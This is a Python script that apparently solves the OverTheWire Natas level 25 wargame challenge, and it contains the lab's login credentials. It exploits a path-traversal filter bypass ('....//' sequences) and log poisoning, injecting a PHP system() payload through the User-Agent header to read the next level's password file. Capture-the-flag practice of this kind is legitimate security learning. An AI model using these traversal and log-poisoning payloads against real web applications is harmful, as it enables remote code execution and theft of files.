#!bin/python3
import requests
import binascii

url = "http://natas25.natas.labs.overthewire.org/"
auth_username = "natas25"
auth_password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"

'''
r = requests.get(url,auth=(auth_username,auth_password))

print(r.text)
print(r.cookies)
'''
'''
params = {'lang':'....//....//....//....//....//etc/passwd'}
r = requests.post(url,auth=(auth_username,auth_password),params=params)

print(r.text)
'''
payload = "<?php system('cat /etc/natas_webpass/natas26'); ?>"
fakeheader = {"User-Agent":payload}
params = {'lang':'....//....//....//....//....//etc/natas_webpass/natas26'}
r = requests.get(url,auth=(auth_username,auth_password),headers=fakeheader,params=params)

payload = ''.join(['....//....//....//....//....//var/www/natas/natas25/logs/natas25_',r.cookies['PHPSESSID'],".log"])
params = {'lang':payload}
r2 = requests.post(url,auth=(auth_username,auth_password),headers=fakeheader,params=params)

print(r2.text)
